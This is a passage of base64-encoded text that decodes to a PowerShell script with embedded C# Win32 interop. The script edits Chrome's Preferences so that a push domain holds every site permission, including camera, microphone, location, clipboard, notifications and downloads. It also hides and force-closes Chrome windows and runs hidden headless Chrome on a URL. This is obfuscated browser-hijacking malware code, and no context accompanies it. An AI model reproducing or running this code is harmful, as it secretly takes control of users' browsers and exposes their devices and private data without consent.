CAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcykgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBkZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgLVZhbHVlIEB7fQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMucG9wdXBzKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBwb3B1cHMgLVZhbHVlIDENCiAgICB9IGVsc2Ugew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnBvcHVwcyA9IDENCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnN1YnJlc291cmNlX2ZpbHRlcikgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgc3VicmVzb3VyY2VfZmlsdGVyIC1WYWx1ZSAxDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5zdWJyZXNvdXJjZV9maWx0ZXIgPSAxDQogICAgfQ0KDQogICAgJHByZWZlcmVuY2VzQ29udGVudEpzb24gPSAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDMyDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCAtVmFsdWUgJHByZWZlcmVuY2VzQ29udGVudEpzb24gLUZvcmNlDQoNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICBpZiAoVGVzdC1QYXRoICRwcmVmZXJlbmNlc1BhdGgpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGNvbnRlbnRTZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMNCiAgICAgICAgJHNldHRpbmdzVG9VcGRhdGUgPSBAKA0KICAgICAgICAgICAgImF1dG9fcGljdHVyZV9pbl9waWN0dXJlIiwgImJhY2tncm91bmRfc3luYyIsICJjYW1lcmEiLCAiY2xpcGJvYXJkIiwgImNvb2tpZXMiLCANCiAgICAgICAgICAgICJnZW9sb2NhdGlvbiIsICJpbWFnZXMiLCAiamF2YXNjcmlwdCIsICJtaWNyb3Bob25lIiwgIm1pZGlfc3lzZXgiLCANCiAgICAgICAgICAgICJub3RpZmljYXRpb25zIiwgInBvcHVwcyIsICJwbHVnaW5zIiwgInNvdW5kIiwgInVuc2FuZGJveGVkX3BsdWdpbnMiLCANCiAgICAgICAgICAgICJhdXRvbWF0aWNfZG93bmxvYWRzIiwgImZsYXNoX2RhdGEiLCAibWl4ZWRfc2NyaXB0IiwgInNlbnNvcnMiLCJ3aW5kb3dfcGxhY2VtZW50Iiwid2ViaWRfYXBpIiwidnIiLA0KICAgICAgICAgICAgInN1YnJlc291cmNlX2ZpbHRlciIsIm1lZGlhX3N0cmVhbV9taWMiLCJtZWRpYV9zdHJlYW1fbWljIiwibWVkaWFfc3RyZWFtX2NhbWVyYSIsImxvY2FsX2ZvbnRzIiwNCiAgICAgICAgICAgICJqYXZhc2NyaXB0X2ppdCIsImlkbGVfZGV0ZWN0aW9uIiwiY2FwdHVyZWRfc3VyZmFjZV9jb250cm9sIiwiYXIiDQoNCiAgICAgICAgKQ0KDQogICAgICAgIGZvcmVhY2ggKCRzZXR0aW5nIGluICRzZXR0aW5nc1RvVXBkYXRlKSB7DQogICAgICAgICAgICBpZiAoJG51bGwgLWVxICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcpIHsNCiAgICAgICAgICAgICAgICAkY29udGVudFNldHRpbmdzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJHNldHRpbmcgLVZhbHVlIEB7fQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHNwZWNpZmljU2V0dGluZyA9ICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcNCiAgICAgICAgICAgIGlmICgkc3BlY2lmaWNTZXR0aW5nLlBTT2JqZWN0LlByb3BlcnRpZXMuTmFtZSAtY29udGFpbnMgJHB1c2hEb21haW4pIHsgICAgICAgICAgICANCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHNwZWNpZmljU2V0dGluZyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICRwdXNoRG9tYWluIC1WYWx1ZSBAew0KICAgICAgICAgICAgICAgICAgICAibGFzdF9tb2RpZmllZCIgPSAiMTMzNjI3MjA1NDU3ODU3NzQiDQogICAgICAgICAgICAgICAgICAgICJzZXR0aW5nIiA9IDENCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZyA9ICRzcGVjaWZpY1NldHRpbmcNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMgPSAkY29udGVudFNldHRpbmdzDQogICAgICAgICR1cGRhdGVkUHJlZmVyZW5jZXNKc29uID0gJHByZWZlcmVuY2VzQ29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KICAgICAgICAkdXBkYXRlZFByZWZlcmVuY2VzSnNvbiB8IFNldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLUVuY29kaW5nIFVURjgNCg0KICAgICAgICB3cml0ZWRiZyAiTm90aWZpY2F0aW9uIHN1YnNjcmlwdGlvbiBmb3IgJHB1c2hEb21haW4gYWRkZWQgc3VjY2Vzc2Z1bGx5IHdpdGggYWxsIHBlcm1pc3Npb25zLiINCiAgICB9IGVsc2Ugew0KICAgICAgICB3cml0ZWRiZyAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiAgICB9DQp9DQoNCg0KDQpmdW5jdGlvbiBDbG9zZS1DaHJvbWVXaW5kb3cgew0KICAgIHBhcmFtICgkd2luZG93KQ0KICAgIFtVc2VyMzJYXTo6Q2xvc2VXaW5kb3coJHdpbmRvdykgfCBPdXQtTnVsbA0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMjUNCn0NCg0KZnVuY3Rpb24gQ2xvc2UtQ2hyb21lIHsNCiAgICBwYXJhbSAoJHByb2Nlc3MpDQogICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZQ0KICAgIHRyeSB7DQogICAgICAgICRwcm9jZXNzLkNsb3NlKCkNCiAgICB9DQogICAgY2F0Y2ggew0KICANCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gQ2xvc2UtQWxsQ2hyb21lcyB7DQogICAgJHdpbmRvd3MgPSBbVXNlcjMyWF06OkVudW1lcmF0ZUFsbFdpbmRvd3MoKQ0KICAgIGZvcmVhY2ggKCR3aW5kb3cgaW4gJHdpbmRvd3MpIA0KICAgIHsNCiAgICAgICAgJHRpdGxlID0gW1VzZXIzMlhdOjpHZXRXaW5kb3dUZXh0KCR3aW5kb3cpDQogICAgICAgIGlmICgkdGl0bGUuQ29udGFpbnMoIkdvb2dsZSBDaHJvbWUiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCR3aW5kb3csIFtVc2VyMzJYXTo6U1dfSElERSkgfCBPdXQtTnVsbA0KICAgICAgICAgICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHdpbmRvdw0KICAgICAgICB9DQogICAgfQ0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdjaHJvbWUuZXhlJykpDQogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZUNocm9tZVB1c2hlcyB7DQogICAgJGF1dG8gPSBUZXN0LUF1dG9zdGFydDsNCiAgICBpZiAoJHNlcnZlci5wdXNoZXNGb3JjZSAtbmUgJGZhbHNlIC1hbmQgJGF1dG8gLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgd3JpdGVkYmcgIlNraXBwaW5nIENvbmZpZ3VyZUNocm9tZVB1c2hlcyINCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIHRyeSB7DQogICAgICAgIA0KICAgDQoNCiAgICBBZGQtVHlwZSBAIg0KICAgIHVzaW5nIFN5c3RlbTsNCiAgICB1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsNCiAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQogICAgdXNpbmcgU3lzdGVtLlRleHQ7DQoNCiAgICBwdWJsaWMgc3RhdGljIGNsYXNzIFVzZXIzMlggew0KICAgICAgICBwdWJsaWMgZGVsZWdhdGUgYm9vbCBFbnVtV2luZG93c1Byb2MoSW50UHRyIGhXbmQsIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bVdpbmRvd3MoRW51bVdpbmRvd3NQcm9jIGxwRW51bUZ1bmMsIEludFB0ciBsUGFyYW0pOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kLCBTdHJpbmdCdWlsZGVyIGxwU3RyaW5nLCBpbnQgbk1heENvdW50KTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dExlbmd0aChJbnRQdHIgaFduZCk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJc1dpbmRvd1Zpc2libGUoSW50UHRyIGhXbmQpOw0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgIGludCBsZW5ndGggPSBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpOw0KICAgICAgICAgICAgaWYgKGxlbmd0aCA9PSAwKSByZXR1cm4gU3RyaW5nLkVtcHR5Ow0KDQogICAgICAgICAgICBTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIobGVuZ3RoICsgMSk7DQogICAgICAgICAgICBHZXRXaW5kb3dUZXh0KGhXbmQsIHNiLCBzYi5DYXBhY2l0eSk7DQogICAgICAgICAgICByZXR1cm4gc2IuVG9TdHJpbmcoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBJc1dpbmRvd1Zpc2libGVFeChJbnRQdHIgaFduZCkgew0KICAgICAgICAgICAgcmV0dXJuIElzV2luZG93VmlzaWJsZShoV25kKSAmJiBHZXRXaW5kb3dUZXh0TGVuZ3RoKGhXbmQpID4gMDsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyW10gRW51bWVyYXRlQWxsV2luZG93cygpIHsNCiAgICAgICAgICAgIHZhciB3aW5kb3dIYW5kbGVzID0gbmV3IExpc3Q8SW50UHRyPigpOw0KICAgICAgICAgICAgRW51bVdpbmRvd3MoKGhXbmQsIGxQYXJhbSkgPT4gew0KICAgICAgICAgICAgICAgIGlmIChJc1dpbmRvd1Zpc2libGVFeChoV25kKSkgew0KICAgICAgICAgICAgICAgICAgICB3aW5kb3dIYW5kbGVzLkFkZChoV25kKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9LCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICByZXR1cm4gd2luZG93SGFuZGxlcy5Ub0FycmF5KCk7DQogICAgICAgIH0NCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2hvd1dpbmRvdyhJbnRQdHIgaFduZCwgaW50IG5DbWRTaG93KTsNCg0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX01JTklNSVpFID0gNjsNCiAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19TSE9XID0gNTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgUG9zdE1lc3NhZ2UoSW50UHRyIGhXbmQsIHVpbnQgTXNnLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKTsNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgQ2xvc2VXaW5kb3coSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgIGNvbnN0IHVpbnQgV01fQ0xPU0UgPSAweDAwMTA7DQogICAgICAgICAgICBQb3N0TWVzc2FnZShoV25kLCBXTV9DTE9TRSwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsNCiAgICAgICAgfQ0KICAgIH0NCiJADQoNCiAgICBpZiAoSGF2ZVRvUHVzaGVzKQ0KICAgIHsNCiAgICAgICAgQ2xvc2UtQWxsQ2hyb21lczsNCiAgICAgICAgUmVtb3ZlLVB1c2hlczsNCiAgICAgICAgQWRkLVB1c2hlczsNCiAgICB9DQoNCn0NCmNhdGNoIHsNCiAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKENvbmZpZ3VyZSBDaHJvbWUgUHVzaGVzKTogJF8iDQp9DQp9DQoNCg0KDQpmdW5jdGlvbiBPcGVuLUNocm9tZVdpdGhVcmwgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLCAkaXNEZWJ1Zw0KICAgICkNCiAgICAkam9iID0gU3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7DQogICAgICAgICAgICBwYXJhbSAoJHVybCwgJGlzRGVidWcpDQoNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgDQogDQogICAgICAgICAgICBBZGQtVHlwZSBAIg0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtOw0KICAgICAgICAgICAgdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQogICAgICAgICAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQogICAgICAgICAgICB1c2luZyBTeXN0ZW0uVGV4dDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBjbGFzcyBVc2VyMzJYIHsNCiAgICAgICAgICAgICAgICBwdWJsaWMgZGVsZWdhdGUgYm9vbCBFbnVtV2luZG93c1Byb2MoSW50UHRyIGhXbmQsIEludFB0ciBsUGFyYW0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEVudW1XaW5kb3dzKEVudW1XaW5kb3dzUHJvYyBscEVudW1GdW5jLCBJbnRQdHIgbFBhcmFtKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQsIFN0cmluZ0J1aWxkZXIgbHBTdHJpbmcsIGludCBuTWF4Q291bnQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dExlbmd0aChJbnRQdHIgaFduZCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgSXNXaW5kb3dWaXNpYmxlKEludFB0ciBoV25kKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldFdpbmRvd1RleHQoSW50UHRyIGhXbmQpIHsNCiAgICAgICAgICAgICAgICAgICAgaW50IGxlbmd0aCA9IEdldFdpbmRvd1RleHRMZW5ndGgoaFduZCk7DQogICAgICAgICAgICAgICAgICAgIGlmIChsZW5ndGggPT0gMCkgcmV0dXJuIFN0cmluZy5FbXB0eTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBTdHJpbmdCdWlsZGVyIHNiID0gbmV3IFN0cmluZ0J1aWxkZXIobGVuZ3RoICsgMSk7DQogICAgICAgICAgICAgICAgICAgIEdldFdpbmRvd1RleHQoaFduZCwgc2IsIHNiLkNhcGFjaXR5KTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNiLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBib29sIElzV2luZG93VmlzaWJsZUV4KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBJc1dpbmRvd1Zpc2libGUoaFduZCkgJiYgR2V0V2luZG93VGV4dExlbmd0aChoV25kKSA+IDA7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBJbnRQdHJbXSBFbnVtZXJhdGVBbGxXaW5kb3dzKCkgew0KICAgICAgICAgICAgICAgICAgICB2YXIgd2luZG93SGFuZGxlcyA9IG5ldyBMaXN0PEludFB0cj4oKTsNCiAgICAgICAgICAgICAgICAgICAgRW51bVdpbmRvd3MoKGhXbmQsIGxQYXJhbSkgPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKElzV2luZG93VmlzaWJsZUV4KGhXbmQpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93SGFuZGxlcy5BZGQoaFduZCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfSwgSW50UHRyLlplcm8pOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gd2luZG93SGFuZGxlcy5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2hvd1dpbmRvdyhJbnRQdHIgaFduZCwgaW50IG5DbWRTaG93KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1dfSElERSA9IDA7DQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19NSU5JTUlaRSA9IDY7DQogICAgICAgICAgICAgICAgcHVibGljIGNvbnN0IGludCBTV19TSE9XID0gNTsNCiAgICAgICAgICAgICAgICBwdWJsaWMgY29uc3QgaW50IFNXX01BWElNSVpFID0gMzsgLy8gQWRkZWQgY29uc3RhbnQgZm9yIG1heGltaXppbmcgd2luZG93DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBQb3N0TWVzc2FnZShJbnRQdHIgaFduZCwgdWludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIENsb3NlV2luZG93KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHVpbnQgV01fQ0xPU0UgPSAweDAwMTA7DQogICAgICAgICAgICAgICAgICAgIFBvc3RNZXNzYWdlKGhXbmQsIFdNX0NMT1NFLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiJADQp9DQpjYXRjaCB7DQp9DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiBDbG9zZS1DaHJvbWVXaW5kb3cgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBwYXJhbSAoJHdpbmRvdykNCiAgICAgICAgICAgICAgICBbVXNlcjMyWF06OkNsb3NlV2luZG93KCR3aW5kb3cpIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwMA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gge30NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZnVuY3Rpb24gQ2xvc2UtQ2hyb21lIHsNCiAgICAgICAgICAgIHBhcmFtICgkcHJvY2VzcykNCiAgICAgICAgICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJHByb2Nlc3MgfCBTdG9wLVByb2Nlc3MgLUZvcmNlDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAkY2hyb21lUGF0aHMgPSBAKA0KICAgICAgICAgICAgIkM6XFByb2dyYW0gRmlsZXNcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICAgICAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwNCiAgICAgICAgICAgICIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lXEFwcGxpY2F0aW9uXGNocm9tZS5leGUiLA0KICAgICAgICAgICAgIiRlbnY6UHJvZ3JhbUZpbGVzKHg4NilcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIg0KICAgICAgICApDQogICAgICAgICRyZXNvbHZlZFBhdGhzID0gQCgpDQogICAgICAgIGZvcmVhY2ggKCRwYXRoIGluICRjaHJvbWVQYXRocykgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkcmVzb2x2ZWRQYXRoID0gUmVzb2x2ZS1QYXRoIC1QYXRoICRwYXRoIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgICAgICAgICAgaWYgKCRyZXNvbHZlZFBhdGggLW5vdGluICRyZXNvbHZlZFBhdGhzKSB7DQogICAgICAgICAgICAgICAgICAgICRyZXNvbHZlZFBhdGhzICs9ICRyZXNvbHZlZFBhdGguUGF0aA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciByZXNvbHZpbmcgcGF0aDogJF8iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHJlc29sdmVkUGF0aHMgPSAkcmVzb2x2ZWRQYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZQ0KICAgICAgICBmb3JlYWNoICgkcGF0aCBpbiAkcmVzb2x2ZWRQYXRocykgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCkgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJGb3VuZCBDaHJvbWUgYXQ6ICRwYXRoIg0KICAgIA0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbw0KICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkZpbGVOYW1lID0gJHBhdGgNCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkaXNEZWJ1ZykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICRwcm9jZXNzU3RhcnRJbmZvLkFyZ3VtZW50cyA9ICItLWhlYWRsZXNzIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uQXJndW1lbnRzICs9ICIgLS1kaXNhYmxlLWdwdSAtLWR1bXAtZG9tICR1cmwiDQogICAgICAgICAgICAgICAgJHByb2Nlc3NTdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAkcHJvY2Vzc1N0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAkcHJvY2VzcyA9IE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MNCiAgICAgICAgICAgICAgICAkcHJvY2Vzcy5TdGFydEluZm8gPSAkcHJvY2Vzc1N0YXJ0SW5mbw0KICAgICAgICAgICAgICAgICRwcm9jZXNzLlN0YXJ0KCkgfCBPdXQtTnVsbCAgICAgICAgIA0KICAgICAgICAgICAgICAgICRlbmRUaW1lID0gKEdldC1EYXRlKS5BZGRTZWNvbmRzKDgpDQogICAgICAgICAgICAgICAgd2hpbGUgKChHZXQtRGF0ZSkgLWx0ICRlbmRUaW1lKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkaXNEZWJ1ZyAtZXEgJGZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbVXNlcjMyWF06OlNob3dXaW5kb3coJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZSwgW1VzZXIzMlhdOjpTV19ISURFKSB8IE91dC1OdWxsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kc